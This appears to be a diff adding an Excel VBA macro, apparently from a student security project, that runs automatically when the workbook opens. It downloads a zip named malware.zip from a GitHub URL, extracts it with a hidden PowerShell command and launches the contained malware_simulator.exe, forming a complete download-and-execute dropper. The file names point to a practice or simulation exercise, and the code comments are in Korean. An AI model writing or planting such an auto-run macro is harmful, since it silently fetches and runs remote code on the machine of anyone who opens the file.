@@ -1,0 +1,58 @@
+Private Sub Workbook_Open()
+    Dim fileURL As String
+    Dim zipPath As String
+    Dim extractFolder As String
+    Dim exePath As String
+    Dim http As Object
+    Dim b() As Byte
+    Dim stream As Object
+    Dim cmd As String
+    Dim shellApp As Object
+
+    ' 1. GitHub 다운로드 링크 (raw)
+    fileURL = "https://github.com/yoona1110/mini_project/raw/main/%EC%8B%A4%EC%8A%B5%EC%9A%A9%20%EC%95%85%EC%84%B1%ED%8C%8C%EC%9D%BC.zip"
+
+    ' 2. 저장 경로
+    zipPath = Environ$("USERPROFILE") & "\Downloads\malware.zip"
+    extractFolder = Environ$("USERPROFILE") & "\Downloads\payload_extracted\"
+    exePath = extractFolder & "malware_simulator.exe"
+
+    ' 3. 파일 다운로드
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    http.Open "GET", fileURL, False
+    http.Send
+
+    If http.Status = 200 Then
+        b = http.ResponseBody
+
+        ' 4. 파일 저장
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1 ' binary
+        stream.Open
+        stream.Write b
+        stream.SaveToFile zipPath, 2
+        stream.Close
+
+        ' 5. 압축 해제 (PowerShell 사용)
+        cmd = "powershell -Command ""Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & extractFolder & "' -Force"""
+        Shell cmd, vbHide
+
+        ' 6. 대기 (압축 해제 완료까지 기다림)
+        Application.Wait (Now + TimeValue("0:00:08"))
+
+        ' 7. EXE 존재 확인 후 실행
+        If Dir(exePath) <> "" Then
+            Set shellApp = CreateObject("Shell.Application")
+            shellApp.ShellExecute exePath, "", "", "open", 1
+        Else
+            MsgBox "실행 파일이 존재하지 않습니다: " & exePath, vbExclamation, "실행 오류"
+        End If
+    Else
+        MsgBox "파일 다운로드 실패. 상태 코드: " & http.Status, vbCritical, "다운로드 오류"
+    End If
+
+    ' 정리
+    Set http = Nothing
+    Set stream = Nothing
+    Set shellApp = Nothing
+End Sub
